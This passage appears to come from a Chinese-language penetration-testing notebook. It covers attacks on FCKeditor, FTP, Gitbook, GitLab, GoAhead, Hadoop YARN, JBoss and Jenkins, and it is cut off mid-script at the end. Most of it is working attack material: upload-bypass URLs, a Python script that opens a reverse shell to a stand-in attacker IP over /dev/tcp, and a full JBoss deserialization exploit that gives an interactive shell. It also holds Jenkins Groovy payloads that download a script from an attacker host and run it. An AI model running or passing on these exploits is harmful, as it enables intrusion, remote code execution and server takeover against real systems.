</ol>
<pre><code>FCKeditor/editor/filemanager/browser/default/connectors/test.html
FCKeditor/editor/filemanager/upload/test.html
FCKeditor/editor/filemanager/connectors/test.html
FCKeditor/editor/filemanager/connectors/uploadtest.html

FCKeditor/_samples/default.html
FCKeditor/_samples/asp/sample01.asp
FCKeditor/_samples/asp/sample02.asp
FCKeditor/_samples/asp/sample03.asp
FCKeditor/_samples/asp/sample04.asp
FCKeditor/_samples/default.html
FCKeditor/editor/fckeditor.htm
FCKeditor/editor/fckdialog.html

FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/
FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/
FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/
FCKeditor/editor/filemanager/browser/default/connectors/jsp/connector.jsp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/
FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/php/connector.php
FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/asp/connector.asp
FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/aspx/connector.aspx
FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=http://www.site.com/fckeditor/editor/filemanager/connectors/jsp/connector.jsp

FCKeditor/editor/filemanager/browser/default/browser.html?type=Image&amp;connector=connectors/asp/connector.asp
FCKeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/jsp/connector.jsp
fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/aspx/connector.Aspx
fckeditor/editor/filemanager/browser/default/browser.html?Type=Image&amp;Connector=connectors/php/connector.php</code></pre><ol start="3">
<li>FCKeditor 突破上传</li>
</ol>
<pre><code>1. 抓包改后缀名、00截断、添加文件头、分号;注释，文件后缀名后空格...
2. 文件名.被修改为_，上传1.asp;.jpg，会变成1_asp;.jpg，再上传1.asp;.jpg，可能会变成1.asp;(1).jpg
3. iis 6.0突破文件夹限制
Fckeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=File&amp;CurrentFolder=/shell.asp&amp;NewFolderName=z.asp
FCKeditor/editor/filemanager/connectors/asp/connector.asp?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=/shell.asp&amp;NewFolderName=z&amp;uuid=1244789975684
FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=CreateFolder&amp;CurrentFolder=/&amp;Type=Image&amp;NewFolderName=shell.asp
4. 解析漏洞：.../image/1.asp/1.jpg</code></pre><ol start="4">
<li>FCKeditor 列目录<pre><code>/fckeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=CreateFolder&amp;Type=Image&amp;CurrentFolder=../../../&amp;NewFolderName=shell.asp
FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/
FCKeditor/editor/filemanager/browser/default/connectors/php/connector.php?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/
FCKeditor/editor/filemanager/browser/default/connectors/asp/connector.asp?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=/
/FCKeditor/editor/filemanager/browser/default/connectors/aspx/connector.aspx?Command=GetFoldersAndFiles&amp;Type=Image&amp;CurrentFolder=c:/</code></pre></li>
</ol>
<hr>
<h2 id="FTP"><a href="#FTP" class="headerlink" title="FTP"></a>FTP</h2><p><strong>扫描发现</strong></p>
<ol>
<li>telnet -vn IP 21</li>
<li>nmap -Pn -p21 -sC IP</li>
<li>nc -vn IP 21</li>
</ol>
<p><strong>匿名访问</strong></p>
<pre><code>&gt;ftp IP
&gt;anonymous
&gt;anonymous
&gt;ls -a</code></pre><p><strong>浏览器访问</strong><br><code>ftp://anonymous:anonymous@IP</code></p>
<p><strong>从FTP下载文件</strong></p>
<pre><code>wget -m ftp://anonymous:anonymous@IP #下载所有文件
wget -m --no-passive ftp://anonymous:anonymous@IP #下载所有文件</code></pre><p><strong>FTP内网扫描</strong></p>
<pre><code>IP：10.1.2.3 ，port：80
PORT 10,1,2,3,0,80
EPRT |2|10.1.2.3|80|
PETR index.html</code></pre><hr>
<h2 id="Gitbook-任意文件读取（CVE-2017-15688）"><a href="#Gitbook-任意文件读取（CVE-2017-15688）" class="headerlink" title="Gitbook 任意文件读取（CVE-2017-15688）"></a><span id="CVE-2017-15688">Gitbook 任意文件读取（CVE-2017-15688）</span></h2><ol>
<li>复现：创建一个md文件<pre><code>ln -s /etc/passwd ./passwd.md</code></pre></li>
</ol>
<hr>
<h2 id="Gitlab-任意文件读取漏洞（CVE-2016-9086）"><a href="#Gitlab-任意文件读取漏洞（CVE-2016-9086）" class="headerlink" title="Gitlab 任意文件读取漏洞（CVE-2016-9086）"></a><span id="CVE-2016-9086">Gitlab 任意文件读取漏洞（CVE-2016-9086）</span></h2><ol>
<li>版本：GitLab CE/EEversions 8.9, 8.10, 8.11, 8.12, and 8.13</li>
<li>环境运行后，Web端口为10080，ssh端口为10022。访问<a href="http://www.0-sec.org:10080，设置管理员（用户名root）密码，登录。" target="_blank" rel="noopener">http://www.0-sec.org:10080，设置管理员（用户名root）密码，登录。</a></li>
<li>新建一个项目，点击GitLab export：</li>
<li>上传<a href="/漏洞记录/test.tar.gz">test.tar.gz</a>，就会读取/etc/passwd</li>
</ol>
<hr>
<h2 id="GoAhead-远程代码溢出漏洞（CVE-2019-5096）"><a href="#GoAhead-远程代码溢出漏洞（CVE-2019-5096）" class="headerlink" title="GoAhead 远程代码溢出漏洞（CVE-2019-5096）"></a><span id="CVE-2019-5096">GoAhead 远程代码溢出漏洞（CVE-2019-5096）</span></h2><ol>
<li>版本：v5.0.1，v.4.1.1和v3.6.5</li>
<li>POC：<a href="https://github.com/ianxtianxt/CVE-2019-5096-GoAhead-Web-Server-Dos-Exploit" target="_blank" rel="noopener">https://github.com/ianxtianxt/CVE-2019-5096-GoAhead-Web-Server-Dos-Exploit</a></li>
</ol>
<pre><code>from pwn import *
import time
import sys
r = remote(sys.argv[1],8080)
rn = b&quot;\r\n&quot;

payload=b&#39;&#39;
payload +=b&quot;--siiit&quot;+rn
payload +=b&quot;Content-Disposition: form-data; name=\&quot;shit1\&quot;; filename=\&quot;shit.file\&quot;;&quot;+rn
payload+= rn
payload+=b&quot;HelloWorld!&quot;+rn
payload +=b&quot;--siiit&quot;+rn
payload +=b&quot;Content-Disposition: form-data;  name=\&quot;shit2\&quot;; filename=\&quot;shit2.file\&quot;&quot;+rn
payload+= rn
payload+=b&quot;FuckkWorld!&quot;+rn
payload +=b&quot;--siiit&quot;+rn

data = b&quot;POST / HTTP/1.1\r\nHost:HelloWorld:8080\r\n&quot;
data +=b&quot;content-type:multipart/form-data&quot;+rn
data +=b&quot;content-type:boundary=siiit&quot;+rn
data +=b&quot;content-length:&quot;+str(len(payload)).encode()+rn
data +=b&quot;cookie:&quot;+b&#39;a&#39;*0x1+rn
data +=rn
data +=payload


r.send(data)
sleep(20)
try:
    dat=r.recvn(1024)
    print(dat)
    r.close()
except:
    r.close()</code></pre><hr>
<h2 id="Hadoop-YARN-ResourceManager-未授权访问"><a href="#Hadoop-YARN-ResourceManager-未授权访问" class="headerlink" title="Hadoop YARN ResourceManager 未授权访问"></a><span id="Hadoop">Hadoop YARN ResourceManager 未授权访问</span></h2><ol>
<li>Hadoop是一个由Apache基金会所开发的分布式系统基础架构，端口：8088</li>
<li>敏感端口：</li>
</ol>
<table>
<thead>
<tr>
<th>模块</th>
<th>节点</th>
<th>默认端口</th>
</tr>
</thead>
<tbody><tr>
<td>HDFS</td>
<td>NameNode</td>
<td>50070</td>
</tr>
<tr>
<td>HDFS</td>
<td>SecondNameNode</td>
<td>50090</td>
</tr>
<tr>
<td>HDFS</td>
<td>DataNode</td>
<td>50075</td>
</tr>
<tr>
<td>HDFS</td>
<td>Backup/Checkpoint node</td>
<td>50105</td>
</tr>
<tr>
<td>MapReduce</td>
<td>JobTracker</td>
<td>50030</td>
</tr>
<tr>
<td>MapReduce</td>
<td>TaskTracker</td>
<td>50030</td>
</tr>
</tbody></table>
<ol start="2">
<li>利用：</li>
<li>在本地监听等待反弹 shell 连接</li>
<li>调用 New Application API 创建 Application</li>
<li>调用 Submit Application API 提交</li>
<li>nc -lvp 9999</li>
</ol>
<pre><code>import requests

target = &#39;http://server_IP:8088/&#39;
lhost = &#39;attacker_ip&#39;  # put your local host ip here, and listen at port 9999

url = target + &#39;ws/v1/cluster/apps/new-application&#39;
resp = requests.post(url)
print(resp.text)
app_id = resp.json()[&#39;application-id&#39;]
url = target + &#39;ws/v1/cluster/apps&#39;
data = {
    &#39;application-id&#39;: app_id,
    &#39;application-name&#39;: &#39;get-shell&#39;,
    &#39;am-container-spec&#39;: {
        &#39;commands&#39;: {
            &#39;command&#39;: &#39;/bin/bash -i &gt;&amp; /dev/tcp/%s/9999 0&gt;&amp;1&#39; % lhost,
        },
    },
    &#39;application-type&#39;: &#39;YARN&#39;,
}
print (data)
requests.post(url, json=data)</code></pre><hr>
<h2 id="Jboss-JMX-Console未授权访问Getshell"><a href="#Jboss-JMX-Console未授权访问Getshell" class="headerlink" title="Jboss JMX Console未授权访问Getshell"></a><span id="Jboss未授权访问">Jboss JMX Console未授权访问Getshell</span></h2><ol>
<li>版本：全版本</li>
<li>未授权访问JMX——<code>ip/domain:8080/jmx-console/null-console/</code>——jboss.system——service=maindeployer</li>
<li>创建war包：<code>jar -cvf qwe.war qwe.jsp</code></li>
<li>部署后访问：<code>ip/domain:8080/qwe/qwe.jsp</code></li>
</ol>
<h2 id="JBoss-JMX-Console-HtmlAdaptor-Getshell（CVE-2007-1036）"><a href="#JBoss-JMX-Console-HtmlAdaptor-Getshell（CVE-2007-1036）" class="headerlink" title="JBoss JMX Console HtmlAdaptor Getshell（CVE-2007-1036）"></a><span id="CVE-2007-1036">JBoss JMX Console HtmlAdaptor Getshell（CVE-2007-1036）</span></h2><ol>
<li>版本：全版本</li>
<li>输入url:<a href="http://ip:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.admin%3Aservice%3DDeploymentFileRepository,定位到store方法" target="_blank" rel="noopener">http://ip:8080/jmx-console/HtmlAdaptor?action=inspectMBean&amp;name=jboss.admin%3Aservice%3DDeploymentFileRepository,定位到store方法</a></li>
<li>传入相应的值（qwe.war、qwe、qwe.jsp、&lt;%…%&gt;），即可getshell</li>
</ol>
<h2 id="JBoss-Administration-Console-弱口令-Getshell"><a href="#JBoss-Administration-Console-弱口令-Getshell" class="headerlink" title="JBoss Administration Console 弱口令 Getshell"></a><span id="JBoss">JBoss Administration Console 弱口令 Getshell</span></h2><ol>
<li>Administration console</li>
<li>admin admin</li>
<li>点击Web application，上传webshell</li>
</ol>
<h2 id="JBoss-4-x-JBossMQ-JMS-反序列化漏洞（CVE-2017-7504）"><a href="#JBoss-4-x-JBossMQ-JMS-反序列化漏洞（CVE-2017-7504）" class="headerlink" title="JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）"></a><span id="CVE-2017-7504">JBoss 4.x JBossMQ JMS 反序列化漏洞（CVE-2017-7504）</span></h2><ol>
<li>版本：JBoss AS 4.x及之前版本</li>
<li>访问：ip:8080/jbossmq-httpil/HTTPServerILServlet，显示 this is the jbossmq http-il</li>
<li>序列化工具：<a href="https://github.com/ianxtianxt/CVE-2015-7501/" target="_blank" rel="noopener">https://github.com/ianxtianxt/CVE-2015-7501/</a></li>
<li>执行命令：</li>
<li><code>javac -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap.java</code></li>
<li><code>java -cp .:commons-collections-3.2.1.jar ReverseShellCommonsCollectionsHashMap attackip:4444</code></li>
<li>攻击机：<code>nc -lvp 4444</code></li>
<li>这个时候在这个目录下生成了一个ReverseShellCommonsCollectionsHashMap.ser文件，然后我们curl就能反弹shell了</li>
<li><code>curl ip:8080/jbossmq-httpil/HTTPServerILServlet --data-binary @ReverseShellCommonsCollectionsHashMap.ser</code></li>
</ol>
<h2 id="JBosS-AS-6-X-反序列化漏洞（CVE-2017-12149）"><a href="#JBosS-AS-6-X-反序列化漏洞（CVE-2017-12149）" class="headerlink" title="JBosS AS 6.X 反序列化漏洞（CVE-2017-12149）"></a><span id="CVE-2017-12149">JBosS AS 6.X 反序列化漏洞（CVE-2017-12149）</span></h2><ol>
<li>版本：JBoss 5.x - 6.x</li>
</ol>
<pre><code>#!/usr/bin/python
#-*- coding:utf-8 -*-

import requests
import binascii
import sys
import re

if len(sys.argv)!=2:
    print(&#39;+---------------------------------------------------------------+&#39;)
    print(&#39;+ DES: by zhzyker as https://github.com/zhzyker/exphub          +&#39;)
    print(&#39;+      as https://github.com/1337g/CVE-2017-10271               +&#39;)
    print(&#39;+---------------------------------------------------------------+&#39;)
    print(&#39;+ USE: python &lt;filename&gt; &lt;url&gt;                                  +&#39;)
    print(&#39;+ EXP: python cve-2017-12149_cmd.py http://freeerror.org:8080   +&#39;)
    print(&#39;+ VER: Jboss AS 5.X                                             +&#39;)
    print(&#39;+      Jboss AS 6.X                                             +&#39;)
    print(&#39;+---------------------------------------------------------------+&#39;)
    sys.exit()
url_in = sys.argv[1]

linux_payload_1 =  &quot;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b734030000&quot; \
             &quot;7870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f&quot; \
             &quot;6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e747279&quot; \
             &quot;8aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563&quot; \
             &quot;743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372&quot; \
             &quot;002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d6170&quot; \
             &quot;2e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f7267&quot; \
             &quot;2f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f72&quot; \
             &quot;6d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374&quot; \
             &quot;696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec&quot; \
             &quot;287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f61706163&quot; \
             &quot;68652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78&quot; \
             &quot;707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e&quot; \
             &quot;732e5472616e73666f726d65723bbd562af1d83418990200007870000000067372003b6f&quot; \
             &quot;72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f&quot; \
             &quot;72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c0009&quot; \
             &quot;69436f6e7374616e7471007e00037870767200176a6176612e6e65742e55524c436c6173&quot; \
             &quot;734c6f61646572000000000000000000000078707372003a6f72672e6170616368652e63&quot; \
             &quot;6f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b657254&quot; \
             &quot;72616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a61&quot; \
             &quot;76612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176&quot; \
             &quot;612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176&quot; \
             &quot;612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563&quot; \
             &quot;743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e43&quot; \
             &quot;6c6173733bab16d7aecbcd5a990200007870000000017672000f5b4c6a6176612e6e6574&quot; \
             &quot;2e55524c3b5251fd24c51b68cd020000787074000e676574436f6e7374727563746f7275&quot; \
             &quot;71007e001a000000017671007e001a7371007e00137571007e0018000000017571007e00&quot; \
             &quot;18000000017571007e001c000000017372000c6a6176612e6e65742e55524c962537361a&quot; \
             &quot;fce47203000749000868617368436f6465490004706f72744c0009617574686f72697479&quot; \
             &quot;71007e00154c000466696c6571007e00154c0004686f737471007e00154c000870726f74&quot; \
             &quot;6f636f6c71007e00154c000372656671007e00157870ffffffffffffffff707400052f74&quot; \
             &quot;6d702f74000074000466696c65707874000b6e6577496e7374616e63657571007e001a00&quot; \
             &quot;0000017671007e00187371007e00137571007e00180000000174000e52756e436865636b&quot; \
             &quot;436f6e6669677400096c6f6164436c6173737571007e001a00000001767200106a617661&quot; \
             &quot;2e6c616e672e537472696e67a0f0a4387a3bb34202000078707371007e00137571007e00&quot; \
             &quot;18000000017571007e001a0000000171007e003371007e001e7571007e001a0000000171&quot; \
             &quot;007e00207371007e00137571007e001800000001757200135b4c6a6176612e6c616e672e&quot; \
             &quot;537472696e673badd256e7e91d7b470200007870000000017400&quot;
win_payload_1 =  &quot;aced0005737200116a6176612e7574696c2e48617368536574ba44859596b8b734030000&quot; \
             &quot;7870770c000000023f40000000000001737200346f72672e6170616368652e636f6d6d6f&quot; \
             &quot;6e732e636f6c6c656374696f6e732e6b657976616c75652e546965644d6170456e747279&quot; \
             &quot;8aadd29b39c11fdb0200024c00036b65797400124c6a6176612f6c616e672f4f626a6563&quot; \
             &quot;743b4c00036d617074000f4c6a6176612f7574696c2f4d61703b7870740003666f6f7372&quot; \
             &quot;002a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e6d6170&quot; \
             &quot;2e4c617a794d61706ee594829e7910940300014c0007666163746f727974002c4c6f7267&quot; \
             &quot;2f6170616368652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f72&quot; \
             &quot;6d65723b78707372003a6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374&quot; \
             &quot;696f6e732e66756e63746f72732e436861696e65645472616e73666f726d657230c797ec&quot; \
             &quot;287a97040200015b000d695472616e73666f726d65727374002d5b4c6f72672f61706163&quot; \
             &quot;68652f636f6d6d6f6e732f636f6c6c656374696f6e732f5472616e73666f726d65723b78&quot; \
             &quot;707572002d5b4c6f72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e&quot; \
             &quot;732e5472616e73666f726d65723bbd562af1d83418990200007870000000067372003b6f&quot; \
             &quot;72672e6170616368652e636f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f&quot; \
             &quot;72732e436f6e7374616e745472616e73666f726d6572587690114102b1940200014c0009&quot; \
             &quot;69436f6e7374616e7471007e00037870767200176a6176612e6e65742e55524c436c6173&quot; \
             &quot;734c6f61646572000000000000000000000078707372003a6f72672e6170616368652e63&quot; \
             &quot;6f6d6d6f6e732e636f6c6c656374696f6e732e66756e63746f72732e496e766f6b657254&quot; \
             &quot;72616e73666f726d657287e8ff6b7b7cce380200035b000569417267737400135b4c6a61&quot; \
             &quot;76612f6c616e672f4f626a6563743b4c000b694d6574686f644e616d657400124c6a6176&quot; \
             &quot;612f6c616e672f537472696e673b5b000b69506172616d54797065737400125b4c6a6176&quot; \
             &quot;612f6c616e672f436c6173733b7870757200135b4c6a6176612e6c616e672e4f626a6563&quot; \
             &quot;743b90ce589f1073296c020000787000000001757200125b4c6a6176612e6c616e672e43&quot; \
             &quot;6c6173733bab16d7aecbcd5a990200007870000000017672000f5b4c6a6176612e6e6574&quot; \
             &quot;2e55524c3b5251fd24c51b68cd020000787074000e676574436f6e7374727563746f7275&quot; \
             &quot;71007e001a000000017671007e001a7371007e00137571007e0018000000017571007e00&quot; \
             &quot;18000000017571007e001c000000017372000c6a6176612e6e65742e55524c962537361a&quot; \
             &quot;fce47203000749000868617368436f6465490004706f72744c0009617574686f72697479&quot; \
             &quot;71007e00154c000466696c6571007e00154c0004686f737471007e00154c000870726f74&quot; \
             &quot;6f636f6c71007e00154c000372656671007e00157870ffffffffffffffff707400112f63&quot; \
             &quot;3a2f77696e646f77732f74656d702f74000074000466696c65707874000b6e6577496e73&quot; \
             &quot;74616e63657571007e001a000000017671007e00187371007e00137571007e0018000000&quot; \
             &quot;0174000e52756e436865636b436f6e6669677400096c6f6164436c6173737571007e001a&quot; \
             &quot;00000001767200106a6176612e6c616e672e537472696e67a0f0a4387a3bb34202000078&quot; \
             &quot;707371007e00137571007e0018000000017571007e001a0000000171007e003371007e00&quot; \
             &quot;1e7571007e001a0000000171007e00207371007e00137571007e00180000000175720013&quot; \
             &quot;5b4c6a6176612e6c616e672e537472696e673badd256e7e91d7b47020000787000000001&quot; \
             &quot;7400&quot;
payload_2 =  &quot;71007e002a7571007e001a0000000171007e002c737200116a6176612e7574696c2e48617&quot; \
             &quot;3684d61700507dac1c31660d103000246000a6c6f6164466163746f724900097468726573&quot; \
             &quot;686f6c6478703f4000000000000077080000001000000000787878&quot;
payload_other = &quot;&quot;
os_type = &quot;unknown&quot;
def build_command_hex(command):
    command_exec_hex = &quot;&quot;.join(&quot;{:02x}&quot;.format(ord(c)) for c in command)
    command_len = len(command)
    command_len_hex = &#39;{:02x}&#39;.format(command_len)
    command_hex = command_len_hex + command_exec_hex
    return command_hex
def build_payload(target_os, command):
    global os_type
    if os_type == &quot;unknown&quot;:
        if target_os == &quot;linux&quot;:
            payload = binascii.unhexlify(linux_payload_1 + build_command_hex(command) + payload_2)
        if target_os == &quot;windows&quot;:
            payload = binascii.unhexlify(win_payload_1 + build_command_hex(command) + payload_2)
    if os_type == &quot;linux&quot;:
        payload = binascii.unhexlify(linux_payload_1 + build_command_hex(command) + payload_2)
    if os_type == &quot;windows&quot;:
        payload = binascii.unhexlify(win_payload_1 + build_command_hex(command) + payload_2)
    return payload
def do_post(payload):
    payload_url = url_in + &quot;/invoker/readonly&quot;
    result = requests.post(payload_url, payload, verify=False)
    result_content = str(result.content)
    return result_content
def check_OS():
    global os_type
    payload_linux = build_payload(&#39;linux&#39;,&#39;whoami&#39;)
    payload_win = build_payload(&#39;windows&#39;,&#39;whoami&#39;)
    linux_re = do_post(payload_linux)
    win_re = do_post(payload_win)
    if  &quot;[L291919]&quot; in linux_re:
        os_type = &#39;linux&#39;
    if &quot;[W291013]&quot; in win_re:
        os_type = &#39;windows&#39;
    return os_type
def run_command(command_in):
    payload = build_payload(os_type,command_in)
    result = do_post(payload)
    result = re.findall ( &#39;](.*?)RunCheckConfig&#39;,result, re.DOTALL)
    if len(result) == 0:
        result.append(&quot;command error!\n&quot;)
    command_callback = result[0]
    return command_callback
check_OS()
if os_type ==&quot;unknown&quot;:
    print &quot;[*] Unknown System&quot;
    exit(0)
print &quot;***************************************************** \n&quot; \
       &quot;*             Target system is  &quot; + os_type + &quot; OS            * \n&quot; \
       &quot;***************************************************** \n&quot;
while 1:
    command_in = raw_input(&quot;Shell &gt;&gt;&gt; &quot;)
    if command_in == &quot;exit&quot; : exit(0)
    print run_command(command_in).decode(&#39;utf-8&#39;)</code></pre><hr>
<h2 id="Jenkins-功能未授权访问导致的远程命令执行漏洞"><a href="#Jenkins-功能未授权访问导致的远程命令执行漏洞" class="headerlink" title="Jenkins 功能未授权访问导致的远程命令执行漏洞"></a><span id="Jenkins">Jenkins 功能未授权访问导致的远程命令执行漏洞</span></h2><ol>
<li>系统管理——脚本命令行——执行任意命令</li>
</ol>
<h2 id="Jenkins-CI-远程代码执行漏洞（CVE-2017-1000353）"><a href="#Jenkins-CI-远程代码执行漏洞（CVE-2017-1000353）" class="headerlink" title="Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）"></a><span id="CVE-2017-1000353">Jenkins-CI 远程代码执行漏洞（CVE-2017-1000353）</span></h2><ol>
<li>所有Jenkins主版本均受到影响(包括&lt;=2.56版本)</li>
<li>所有Jenkins LTS 均受到影响( 包括&lt;=2.46.1版本)</li>
<li><a href="https://github.com/ianxtianxt/CVE-2017-1000353" target="_blank" rel="noopener">https://github.com/ianxtianxt/CVE-2017-1000353</a></li>
<li>执行命令：```java -jar CVE-2017-1000353-1.1-SNAPSHOT-all.jar jenkins_poc.ser “touch /tmp/success”</li>
<li>执行上述代码后，生成jenkins_poc.ser文件</li>
<li>python3执行python <a href="https://github.com/ianxtianxt/CVE-2017-1000353" target="_blank" rel="noopener">exploit.py</a> <a href="http://www.0-sec.org:8080" target="_blank" rel="noopener">http://www.0-sec.org:8080</a> jenkins_poc.ser</li>
</ol>
<pre><code>import urllib
import sys
import requests
import uuid
import threading
import time
import gzip
import urllib3
import zlib

proxies = {
# &#39;http&#39;: &#39;http://127.0.0.1:8085&#39;,
# &#39;https&#39;: &#39;http://127.0.0.1:8090&#39;,
}
URL = &#39;%s/cli&#39; % sys.argv[1].rstrip(&#39;/&#39;)
PREAMLE = b&#39;&lt;===[JENKINS REMOTING CAPACITY]===&gt;rO0ABXNyABpodWRzb24ucmVtb3RpbmcuQ2FwYWJpbGl0eQAAAAAAAAABAgABSgAEbWFza3hwAAAAAAAAAH4=&#39;
PROTO = b&#39;\x00\x00\x00\x00&#39;
with open(sys.argv[2], &quot;rb&quot;) as f:
    FILE_SER = f.read()
def download(url, session):
    headers = {&#39;Side&#39; : &#39;download&#39;}
    headers[&#39;Content-type&#39;] = &#39;application/x-www-form-urlencoded&#39;
    headers[&#39;Session&#39;] = session
    headers[&#39;Transfer-Encoding&#39;] = &#39;chunked&#39;
    r = requests.post(url, data=null_payload(), headers=headers, proxies=proxies, stream=True, verify=False)
    print(r.content)
def upload(url, session, data):
    headers = {&#39;Side&#39; : &#39;upload&#39;}
    headers[&#39;Session&#39;] = session
    headers[&#39;Content-type&#39;] = &#39;application/octet-stream&#39;
    headers[&#39;Accept-Encoding&#39;] = None
    r = requests.post(url,data=data,headers=headers,proxies=proxies, verify=False)
def upload_chunked(url,session, data):
    headers = {&#39;Side&#39; : &#39;upload&#39;}
    headers[&#39;Session&#39;] = session
    headers[&#39;Content-type&#39;] = &#39;application/octet-stream&#39;
    headers[&#39;Accept-Encoding&#39;]= None
    headers[&#39;Transfer-Encoding&#39;] = &#39;chunked&#39;
    headers[&#39;Cache-Control&#39;] = &#39;no-cache&#39;
    r = requests.post(url, headers=headers, data=create_payload_chunked(), proxies=proxies, verify=False)
def null_payload():
    yield b&quot; &quot;
def create_payload():
    payload = PREAMLE + PROTO + FILE_SER
    return payload
def create_payload_chunked():
    yield PREAMLE
    yield PROTO
    yield FILE_SER
def main():
    print(&quot;start&quot;)
    session = str(uuid.uuid4())
    t = threading.Thread(target=download, args=(URL, session))
    t.start()  
    time.sleep(2)
    print(&quot;pwn&quot;)
    #upload(URL, session, create_payload())
    upload_chunked(URL, session, &quot;asdf&quot;)
if __name__ == &quot;__main__&quot;:
    main()</code></pre><p><a href="https://vulhub.org/#/environments/jenkins/CVE-2017-1000353/" target="_blank" rel="noopener">https://vulhub.org/#/environments/jenkins/CVE-2017-1000353/</a></p>
<h2 id="Jenkins-远程命令执行漏洞（CVE-2018-1000861）"><a href="#Jenkins-远程命令执行漏洞（CVE-2018-1000861）" class="headerlink" title="Jenkins 远程命令执行漏洞（CVE-2018-1000861）"></a><span id="CVE-2018-1000861">Jenkins 远程命令执行漏洞（CVE-2018-1000861）</span></h2><ol>
<li>Jenkins Version &lt;= 2.56</li>
<li>Jenkins LTS Version &lt;= 2.46.1</li>
</ol>
<p><strong>POC</strong></p>
<p><code>http://serverip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public class x {public x(){&quot;touch /tmp/CVE-2018-1000861_is_success&quot;.execute()}}</code></p>
<p><strong>反弹shell</strong></p>
<p><code>bash -i &gt;&amp; /dev/tcp/attackip/8888 0&gt;&amp;1</code></p>
<p><code>#curl -o /tmp/1.sh http://attackip/1.txt</code></p>
<p><code>http://serverip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public class x {public x(){&quot;curl+-o+/tmp/1.sh+http://attackip/1.txt&quot;.execute()}}</code>  </p>
<p><code>#chmod 777 /tmp/1.sh</code></p>
<p><code>http://serverip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public class x {public x(){&quot;chmod+777+/tmp/1.sh&quot;.execute()}}</code> </p>
<p><code>nc -lvvp 8888</code></p>
<p><code>http://serverip:8080/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=public class x {public x(){&quot;bash+/tmp/1.sh&quot;.execute()}}</code> </p>
<p><strong>exp.py</strong><br>curl -s -I <a href="http://serverip/|" target="_blank" rel="noopener">http://serverip/|</a> grep X-Jenkins<br>python exp.py <a href="http://serverip/" target="_blank" rel="noopener">http://serverip/</a> ‘curl baidu.com’<br>python exp.py <a href="http://serverip/" target="_blank" rel="noopener">http://serverip/</a> “bash /tmp/1.sh”</p>
<pre><code>#!/usr/bin/python
# coding: UTF-8
import sys
import requests
from enum import Enum
# remove bad SSL warnings
try:
    requests.packages.urllib3.disable_warnings()
except:
    pass
endpoint = &#39;descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript&#39;
class mode(Enum):
    ACL_PATCHED = 0
    NOT_JENKINS = 1
    READ_ENABLE = 2
    READ_BYPASS = 3
    ENTRY_NOTFOUND = 999
def usage():
